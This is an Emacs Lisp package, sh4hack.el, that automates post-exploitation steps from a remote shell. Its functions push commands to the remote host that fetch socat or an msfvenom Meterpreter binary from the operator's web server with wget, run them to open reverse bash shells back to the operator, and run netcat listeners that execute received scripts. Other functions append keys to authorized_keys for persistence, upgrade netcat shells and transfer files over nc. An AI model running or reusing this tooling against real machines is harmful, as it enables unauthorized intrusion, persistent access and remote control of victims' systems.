;; -*- lexical-binding: t -*-

;;; sh4hack.el --- Shell utilities for Emacs hackers

;; Author: tipotto <tipotto404@gmail.com>
;; Copyright (C) 2022 tipotto, all rights reserved.
;; Version: 1.0

(require 'multi-term)
(require 'hydra)
(require 'sh4hack-keybinds)

(fset 'sh (symbol-function 'shell-command-to-string))

(defgroup sh4hack nil
  "Group for sh4hack")

(defcustom sh4h-conf-dir "$HOME/.emacs.d/sh4hack"
  "The default directory for sh4hack configuration."
  :type 'string
  :group 'sh4hack)

(defcustom sh4h-scripts-dir (format "%s/scripts" sh4h-conf-dir)
  "The default directory for pre-installed sh4hack scripts."
  :type 'string
  :group 'sh4hack)

(defcustom sh4h-rfiles-dir (format "%s/rfiles" sh4h-conf-dir)
  "The default directory for editing files on remote server."
  :type 'string
  :group 'sh4hack)

(defcustom sh4h-www-dir (format "%s/www" sh4h-conf-dir)
  "The default directory for files where remote server downloads."
  :type 'string
  :group 'sh4hack)

(defconst async-buffer-name "*Async shell command*")
(defconst buffer-not-found-error-message "Selected buffer not found.")
(defconst process-not-found-error-message "No process running.")

(defun replace-in-string (what with in)
  (replace-regexp-in-string (regexp-quote what) with in nil 'literal))

(defun get-lhost ()
  (interactive)
  (replace-in-string "\n" "" (sh "/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1")))

(defvar sh4h-user nil)
(defvar sh4h-rhost nil)
(defvar sh4h-lhost (get-lhost))
(defvar sh4h-port nil)
(defvar sh4h-term-num nil)

(defmacro inc (var)
  `(setq ,var (1+ ,var)))

(defmacro create-sentinel (&rest forms)
  `(lambda (process signal)
     (when (memq (process-status process) '(exit signal))
       ,@forms
       (shell-command-sentinel process signal))))

(defmacro run (&optional term &rest forms)
  (interactive)
  (let ((err-msg buffer-not-found-error-message))
    `(lambda ()
       (if (not ,term)
	   (message ,err-msg)
	 ,@forms))))

(defmacro run-and-monitor (proc sentinel &optional term &rest forms)
  (interactive)
  (let ((err-msg buffer-not-found-error-message))
    `(lambda ()
       (if (not ,term)
	   (message ,err-msg)
	 (if (not (process-live-p ,proc))
	     (message ,err-msg)
           (set-process-sentinel ,proc ,sentinel)
	   ,@forms)))))

(defun ssh-with-public-key ()
  (interactive)
  (find-file "/ssh:hack:~/"))

(defun ssh-with-password (user rhost port)
  (interactive)
  (find-file (format "/ssh:%s@%s#%s:~/" user rhost port)))

(defun register-public-key (rhost)
  (interactive)
  (if rhost
      (transfer-script rhost "~/.ssh/id_rsa.pub")
    (transfer-script (get-rhost) "~/.ssh/id_rsa.pub")))

(defun generate-ssh-conf (user rhost port)
  (interactive)
  (sh (format "%s/generate-ssh-config.sh %s %s %s" sh4h-scripts-dir user rhost port)))

(defun generate-ssh-key (user rhost)
  (interactive)
  (sh (format "ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa <<< y -N '' -C %s@%s -q" user rhost)))

(defun read-user ()
  (interactive)
  (setq sh4h-user (read-string "User?: ")))

(defun read-rhost ()
  (interactive)
  (setq sh4h-rhost (read-string "Rhost?: ")))

(defun read-port ()
  (interactive)
  (setq sh4h-port (read-string "Port?: " nil nil 22)))

(defun read-term-num ()
  (interactive)
  (setq sh4h-term-num (read-string "*terminal<?>*: " nil nil 1)))

(defun get-user ()
  (interactive)
  (unless sh4h-user
    (read-user))
  sh4h-user)

(defun get-rhost ()
  (interactive)
  (unless sh4h-rhost
    (read-rhost))
  sh4h-rhost)

(defun get-port ()
  (interactive)
  (unless sh4h-port
    (read-port))
  sh4h-port)

(defun get-term-num ()
  (interactive)
  (unless sh4h-term-num
    (read-term-num))
  sh4h-term-num)

(defun register-info ()
  (interactive)
  (read-user)
  (read-rhost)
  (read-port)
  (read-term-num)
  (get-info))

(defun get-info ()
  (interactive)
  (message (format "User: %s\nRhost: %s\nLhost: %s\nPort: %s\nTerm Num: %s\n" sh4h-user sh4h-rhost sh4h-lhost sh4h-port sh4h-term-num)))

(defun prepare-ssh-key ()
  (interactive)
  (let ((user (get-user))
	(rhost (get-rhost))
	(port (get-port)))
    (generate-ssh-key user rhost)    
    (generate-ssh-conf user rhost port)
    (register-public-key rhost)))

(defun auth-with-password ()
  (interactive)
  (ssh-with-password (get-user) (get-rhost) (get-port)))

(defun auth-with-public-key ()
  (interactive)
  (let ((term (get-term-buffer)))
    (funcall (run term
		  (if (y-or-n-p "Generate ssh key pair?: ")
		      (progn (start-remote-listener term t)
			     (prepare-ssh-key)
			     (ssh-with-public-key))
		    (ssh-with-public-key))))))
  
(defun sh-in-buffer (buffer command-string)
  (interactive)
  (comint-send-string
   (get-buffer-process buffer)
   (concat command-string "\n")))

(defun get-buffer-list (buf-name-prefix)
  (interactive)
  (seq-filter (lambda (buf-name) (string-prefix-p buf-name-prefix buf-name)) (mapcar 'buffer-name (buffer-list))))

(defun concat-string-list (list)
  (interactive)
  (mapconcat 'identity list "\n"))

(defun get-term-buffer-by-num (term-num)
  (interactive)
  (get-buffer (format "*terminal<%s>*" term-num)))

(defun get-term-buffer ()
  (interactive)
  (if sh4h-term-num
      (get-term-buffer-by-num sh4h-term-num)
    (let ((buf (generate-new-buffer "*terminals*")))
      (switch-to-buffer buf)
      (insert "****** terminals ******\n")
      (insert (concat-string-list (get-buffer-list "*terminal<")))
      (let ((term (get-term-buffer-by-num (read-term-num))))
        (kill-buffer buf)
        term))))

(defun start-remote-listener (buffer &optional if-pubkey)
  (interactive)
  (when buffer
    (if if-pubkey
	(sh-in-buffer buffer "nc -lp 7777 >> \"${HOME}/.ssh/authorized_keys\"")
      (sh-in-buffer buffer "nc -lp 7777 > /tmp/script.sh && chmod +x /tmp/script.sh && . /tmp/script.sh"))))

(defun get-process-num (cmd-str)
  (interactive)
  (string-to-number (sh (format "ps auxww | grep \"%s\" | grep -v grep | wc -l" cmd-str))))

(defun process-exists-p (cmd-str)
  (interactive)
  (unless (= 0 (get-process-num cmd-str)) t))

(defun get-pid (process-name)
  (interactive)
  (sh (format "pgrep -f \"%s\"" process-name)))

(defun start-web-server ()
  (interactive)
  (let ((command (format "python3 -m http.server 80 -d %s" sh4h-www-dir)))
    (unless (process-exists-p command)
      (async-shell-command command))))

(defun kill-async-buffers ()
  (interactive)
  (create-sentinel
   (kill-matching-buffers (format "^%s" async-buffer-name) nil t)))

(defun generate-async-proc (command)
  (interactive)
  (let* ((buffer-name (generate-new-buffer-name async-buffer-name))
	 (output-buffer (generate-new-buffer buffer-name)))
    (async-shell-command command output-buffer)
    (get-buffer-process output-buffer)))

(defun transfer-script (rhost file-path)
  (interactive)
  (sh (format "nc -w 3 %s 7777 < %s" rhost file-path)))

(defun process-listen-p (port)
  (interactive)
  (when (string= 'LISTEN (sh (format "netstat -tl | grep -iE %s | awk '{print $6}'" port)))))

(defun port-in-use-p (port)
  (interactive)
  (unless (= 0 (length (sh (format "lsof -i:%s" port))))
    t))

(defun get-free-port (start end)
  (let ((port start))
    (while (and (port-in-use-p port) (< port end))
      (message "Port %s is in use..." port)
      (inc port))
    (when (< port end)
      port)))

(defun await-socat-connection (term port)
  (interactive)
  (create-sentinel
   (let ((counter 0))
     (while (and (process-listen-p port) (< counter 10))
       (message "Socat is listening on %s..." port)
       (sleep-for 1)
       (inc counter))
     (when (< counter 10)
       (kill-matching-buffers (format "^%s" async-buffer-name) nil t)
       (sh-in-buffer term "cd ~")
       (sh-in-buffer term "export SHELL=bash; export TERM=eterm-color")
       (sh-in-buffer term "stty rows 60 columns 126")))))

(defun connect-with-socat ()
  (interactive)
  (let* ((term (get-term-buffer))
	 (mterm (multi-term))
	 (port (get-free-port 8500 8600))
	 (lcmd (format ". %s/banner.sh && { ls %s/socat || { wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O %s/socat && chmod +x %s/socat; } } && %s/socat file:`tty`,raw,echo=0 TCP-L:%s" sh4h-scripts-dir sh4h-www-dir sh4h-www-dir sh4h-www-dir sh4h-www-dir port))
	 ;(rcmd (format "FILE=$(cd /tmp && wget http://%s/socat 2>&1 | grep Saving | cut -d ' ' -f 3 | sed -e 's/[^A-Za-z0-9._-]//g') && chmod +x /tmp/$FILE && { { sleep 1 && nc -z -w 3 %s 8889; } & } && { /tmp/$FILE exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost sh4h-lhost port))
	 ;(rcmd (format "cd /tmp && { ls socat >/dev/null 2>&1 || { wget http://%s/socat && chmod +x socat; } } && { { sleep 1 && nc -z -w 3 %s 8889; } & } && { ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s & } && cd ~" sh4h-lhost sh4h-lhost sh4h-lhost port))
         (rcmd (format "cd /tmp && { ls socat >/dev/null 2>&1 || { wget http://%s/socat && chmod +x socat; } } && { { nc -z -w 3 %s 8889 && ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s; } & } && cd ~" sh4h-lhost sh4h-lhost sh4h-lhost port))
	 (proc (generate-async-proc "nc -lp 8889")))
    (funcall (run-and-monitor proc
		              (await-socat-connection mterm port)
		              term
		              (start-web-server)
		              (sh-in-buffer mterm lcmd)
		              (sh-in-buffer term rcmd)))))

(defun inspect-server ()
  (interactive)
  (let ((term (get-term-buffer))
	(rcmd (format "cd /tmp && { ls inspect.sh >/dev/null 2>&1 || { wget http://%s/inspect.sh && chmod +x inspect.sh; } } && ./inspect.sh && cd ~ && { nc -z -w 3 %s 8889 & }" sh4h-lhost sh4h-lhost))
	(proc (generate-async-proc "nc -lp 8889")))
    (funcall (run-and-monitor proc
			      (kill-async-buffers)
			      term
			      (start-web-server)
			      (sh-in-buffer term rcmd)))))

(defun upgrade-netcat ()
  (interactive)
  (let ((term (get-term-buffer))
	(kill-buffer-query-functions nil))
    (funcall (run term
		  (sh-in-buffer term "python3 -c \"import pty;pty.spawn('/bin/bash')\"")
                  (sleep-for 1)
                  (sh-in-buffer (multi-term) (format "kill -s STOP %s" (get-pid "rlwrap nc -lvnp 4444")))
                  (sleep-for 1)
                  (kill-buffer)
                  (switch-to-buffer term)
                  (sh-in-buffer term "stty raw -echo; fg")
                  (sleep-for 1)
                  (sh-in-buffer term "echo '[*] Netcat shell is successfully upgraded.\n'")))))

(defun mold-lhost-ip ()
  (interactive)
  (replace-in-string "." "" sh4h-lhost))

(defun generate-exploit (payload exp-name lport ext)
  (interactive)
  (message "generate-exploit exp-name: %s" exp-name)
  (let ((exp-path (format "%s/%s" sh4h-www-dir exp-name)))
    (sh (format "ls %s >/dev/null 2>&1 || msfvenom -p %s LHOST=%s LPORT=%s -o %s -f %s" exp-path payload sh4h-lhost lport exp-path ext))))

(defun get-windows-payload (arch type)
  (interactive)
  (cond ((and (string= arch "x64") (string= type "staged")) "windows/x64/meterpreter/reverse_tcp")
	((and (string= arch "x64") (string= type "stageless")) "windows/x64/meterpreter_reverse_tcp")
	((and (string= arch "x86") (string= type "staged")) "windows/meterpreter/reverse_tcp")
	((and (string= arch "x86") (string= type "stageless")) "windows/meterpreter_reverse_tcp")))

(defun get-linux-payload (arch type)
  (interactive)
  (cond ((and (string= arch "x64") (string= type "staged")) "linux/x64/meterpreter/reverse_tcp")
	((and (string= arch "x64") (string= type "stageless")) "linux/x64/meterpreter_reverse_tcp")
	((and (string= arch "x86") (string= type "staged")) "linux/x86/meterpreter/reverse_tcp")
	((and (string= arch "x86") (string= type "stageless")) "linux/x86/meterpreter_reverse_tcp")))

(defun get-linux-exploit-base-name (arch type)
  (interactive)
  (cond ((and (string= arch "x64") (string= type "staged")) "linux-x64-staged")
	((and (string= arch "x64") (string= type "stageless")) "linux-x64-stageless")
	((and (string= arch "x86") (string= type "staged")) "linux-x86-staged")
	((and (string= arch "x86") (string= type "stageless")) "linux-x86-stageless")))

(defun get-linux-exploit-name (arch type lport)
  (interactive)
  (let ((lhost-str (mold-lhost-ip))
	(base-name (get-linux-exploit-base-name arch type)))
    (format "%s-%s-%s" base-name lhost-str lport)))

(defun msf-windows (arch type)
  (interactive)
  (get-windows-payload arch type))

(defun msf-linux (arch type)
  (interactive)
  (let* ((term (get-term-buffer))
	 (lport 5555)
	 (rhost (get-rhost))
	 (payload (get-linux-payload arch type))
	 (exp-name (get-linux-exploit-name arch type lport))
	 (lcmd1 (format ". %s/generate-msf-rc.sh %s %s" sh4h-scripts-dir payload sh4h-lhost))
	 (lcmd2 (format ". %s/banner.sh && msfconsole -r %s/msf.rc -q" sh4h-scripts-dir sh4h-scripts-dir))
	 ;(rcmd (format "FILE=$(cd /tmp && wget http://%s/exploit.elf 2>&1 | grep Saving | cut -d ' ' -f 3 | sed -e 's/[^A-Za-z0-9._-]//g') && { nc -z -w 3 %s 8889 & } && chmod +x /tmp/$FILE && { /tmp/$FILE & } && cd ~" sh4h-lhost sh4h-lhost))
	 (rcmd (format "cd /tmp && { ls %s >/dev/null 2>&1 || { wget http://%s/%s && chmod +x %s; } } && { ./%s & } && cd ~ && { nc -z -w 3 %s 8889 & }" exp-name sh4h-lhost exp-name exp-name sh4h-lhost exp-name))
	 (proc (generate-async-proc "nc -lp 8889")))
    (funcall (run-and-monitor proc
		              (kill-async-buffers)
		              term
			      (start-web-server)
			      (generate-exploit payload exp-name lport 'elf)
	                      (sh lcmd1)
                              (sh-in-buffer (multi-term) lcmd2)
                              (sh-in-buffer term rcmd)))))

(defun after-save-remote-file (file path term)
  (interactive)
  (let* ((rcmd (format "{ nc -lp 10000 > %s && echo '[*] %s is written successfully!\n' && nc -z -w 3 %s 8889; } || echo '[*] No write permission for file or dir...\n'" file file sh4h-lhost))
	 (acmd (format "nc -w 3 %s 10000 < %s" (get-rhost) path))
	 (proc (generate-async-proc "nc -lp 8889")))
    (funcall (run-and-monitor proc
			      (kill-async-buffers)
			      'term
			      (remove-hook 'after-save-hook (apply-partially #'after-save-remote-file file path term))
			      (kill-buffer)
			      (sh-in-buffer term rcmd)
			      (async-shell-command acmd)))))

(defun after-remote-file-transfer (file path term)
  (interactive)
  (create-sentinel
   (add-hook 'after-save-hook (apply-partially #'after-save-remote-file file path term))
   (find-file path)))

(defun edit-remote-file ()
  (interactive)
  (let* ((term (get-term-buffer))
   	 (file (read-string "File?: "))
   	 (path (format "%s/%s" sh4h-rfiles-dir file))
   	 (rcmd (format "nc -w 3 %s 9999 < %s" sh4h-lhost file))
   	 (proc (generate-async-proc (format "nc -lp 9999 > %s" path))))
    (funcall (run-and-monitor proc
			      (after-remote-file-transfer file path term)
			      term
			      (sh-in-buffer term rcmd)))))

(provide 'sh4hack)
